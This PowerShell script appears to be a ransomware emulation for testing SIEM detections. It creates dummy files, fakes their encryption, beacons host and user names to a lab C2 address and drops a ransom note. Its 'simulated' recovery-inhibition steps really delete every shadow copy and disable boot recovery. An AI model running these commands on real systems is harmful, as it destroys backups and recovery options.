<#
=============================================================================================
  PROJECT: Windows Server Ransomware Attack Simulation (Safe Educational Emulation)
  AUTHOR: SOC / DFIR Incident Detection Project
  PURPOSE: Emulate Ransomware TTPs to generate realistic telemetry for SIEM detection.
  MITRE ATT&CK TECHNIQUES:
    - T1059.001 : Command and Scripting Interpreter (PowerShell)
    - T1490     : Inhibit System Recovery (Volume Shadow Copy & Boot Tampering)
    - T1071.001 : Application Layer Protocol: Web Protocols (C2 Beaconing)
    - T1486     : Data Encrypted for Impact (Mass File Renaming & Content Overwrite)
    - T1491     : Defacement / Ransom Note Drop
=============================================================================================
#>

[CmdletBinding()]
param (
    [string]$TargetFolder = "C:\Ransomware_Test_Data",
    [string]$C2ServerIP = "192.168.56.10",
    [int]$C2Port = 8080,
    [int]$DummyFileCount = 30
)

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host " [!] STARTING CONTROLLED RANSOMWARE SIMULATION" -ForegroundColor Yellow
Write-Host " Target Directory : $TargetFolder" -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

# ------------------------------------------------------------------------------------------
# Setup: Prepare Dummy Files if they do not already exist
# ------------------------------------------------------------------------------------------
if (-not (Test-Path -Path $TargetFolder)) {
    Write-Host "[+] Creating target sandbox directory: $TargetFolder" -ForegroundColor Gray
    New-Item -Path $TargetFolder -ItemType Directory -Force | Out-Null
}

Write-Host "[+] Populating dummy corporate documents for encryption simulation..." -ForegroundColor Gray
$extensions = @(".docx", ".xlsx", ".pdf", ".txt", ".sql")
for ($i = 1; $i -le $DummyFileCount; $i++) {
    $ext = $extensions[$i % $extensions.Count]
    $filePath = Join-Path -Path $TargetFolder -ChildPath "financial_report_$i$ext"
    if (-not (Test-Path $filePath)) {
        Set-Content -Path $filePath -Value "Confidential Company Record #$i. Financial data: `$$(Get-Random -Minimum 1000 -Maximum 99999)"
    }
}

Start-Sleep -Seconds 2

# ------------------------------------------------------------------------------------------
# Phase 1: Inhibit System Recovery (MITRE T1490) - Core Ransomware Indicator
# ------------------------------------------------------------------------------------------
Write-Host "`n[*] Phase 1: Executing Inhibit System Recovery commands (T1490)..." -ForegroundColor Yellow

# Note: We invoke through cmd.exe to simulate the typical process lineage (cmd -> vssadmin)
Write-Host "  -> Simulating Volume Shadow Copy Deletion..." -ForegroundColor Red
Start-Process cmd.exe -ArgumentList "/c vssadmin.exe delete shadows /all /quiet" -Wait -WindowStyle Hidden

Write-Host "  -> Simulating WMIC Shadowcopy Deletion..." -ForegroundColor Red
Start-Process cmd.exe -ArgumentList "/c wmic shadowcopy delete" -Wait -WindowStyle Hidden

Write-Host "  -> Simulating BCDEdit Recovery Disabling..." -ForegroundColor Red
Start-Process cmd.exe -ArgumentList "/c bcdedit /set {default} recoveryenabled No" -Wait -WindowStyle Hidden
Start-Process cmd.exe -ArgumentList "/c bcdedit /set {default} bootstatuspolicy ignoreallfailures" -Wait -WindowStyle Hidden

Start-Sleep -Seconds 2

# ------------------------------------------------------------------------------------------
# Phase 2: Command & Control (C2) Outbound Beaconing (MITRE T1071.001)
# ------------------------------------------------------------------------------------------
Write-Host "`n[*] Phase 2: Simulating Outbound C2 Beaconing (T1071.001)..." -ForegroundColor Yellow
Write-Host "  -> Establishing HTTP connection to simulated C2 ($C2ServerIP:$C2Port)..." -ForegroundColor Red
try {
    $beaconUri = "http://${C2ServerIP}:${C2Port}/api/v1/beacon?host=$($env:COMPUTERNAME)&user=$($env:USERNAME)"
    $req = [System.Net.WebRequest]::Create($beaconUri)
    $req.Timeout = 3000
    $resp = $req.GetResponse()
    $resp.Close()
} catch {
    Write-Host "  [i] Outbound packet transmitted (Host may be offline, network telemetry generated)." -ForegroundColor DarkGray
}

Start-Sleep -Seconds 1

# ------------------------------------------------------------------------------------------
# Phase 3: Mass File Encryption & Renaming (MITRE T1486)
# ------------------------------------------------------------------------------------------
Write-Host "`n[*] Phase 3: Simulating Mass File Encryption & Renaming (T1486)..." -ForegroundColor Yellow
$filesToEncrypt = Get-ChildItem -Path $TargetFolder -File | Where-Object { $_.Extension -ne ".locked" -and $_.Name -ne "README_RESTORE.txt" }

$count = 0
foreach ($file in $filesToEncrypt) {
    # 1. Overwrite with mock encrypted payload
    $encryptedHeader = "[AES-256-ENCRYPTED-PAYLOAD]::KEY_ID=" + [System.Guid]::NewGuid().ToString()
    [System.IO.File]::WriteAllText($file.FullName, $encryptedHeader)

    # 2. Rename to ransomware extension
    $lockedPath = $file.FullName + ".locked"
    Rename-Item -Path $file.FullName -NewName (Split-Path -Leaf $lockedPath)

    $count++
    Write-Host "  [ENCRYPTED] $($file.Name) -> $($file.Name).locked" -ForegroundColor DarkRed
    Start-Sleep -Milliseconds 40
}
Write-Host "[+] Total files encrypted in simulation: $count" -ForegroundColor Green

# ------------------------------------------------------------------------------------------
# Phase 4: Dropping Ransom Note (MITRE T1491)
# ------------------------------------------------------------------------------------------
Write-Host "`n[*] Phase 4: Dropping Ransomware Note (T1491)..." -ForegroundColor Yellow
$ransomNote = @"
================================================================================
                    *** YOUR FILES ARE STRONGLY ENCRYPTED ***
================================================================================
All your corporate data, databases, documents, and spreadsheets have been locked
with AES-256 and RSA-4096 cryptographic algorithms.

Any attempt to decrypt files with third-party software will destroy your data!

To restore your systems:
1. Do not shut down or restart the server.
2. Visit the decryption portal via Tor Browser:
   http://darkcryptox7q2994.onion/portal/SRV-$($env:COMPUTERNAME)
3. Enter your unique Victim ID: V-$(Get-Random -Minimum 100000 -Maximum 999999)

You have 72 hours before the private decryption key is permanently destroyed.
================================================================================
"@

$notePath1 = Join-Path -Path $TargetFolder -ChildPath "README_RESTORE.txt"
$notePath2 = "C:\Users\Public\Desktop\README_RESTORE.txt"

Set-Content -Path $notePath1 -Value $ransomNote -Force
try { Set-Content -Path $notePath2 -Value $ransomNote -Force } catch {}

Write-Host "  [+] Ransom note dropped at: $notePath1" -ForegroundColor Red
Write-Host "  [+] Ransom note dropped at: $notePath2" -ForegroundColor Red

Write-Host "`n==========================================================" -ForegroundColor Cyan
Write-Host " [✔] SIMULATION EXECUTION FINISHED!" -ForegroundColor Green
Write-Host " Check your SIEM (Splunk / ELK) for alerts and telemetry." -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan
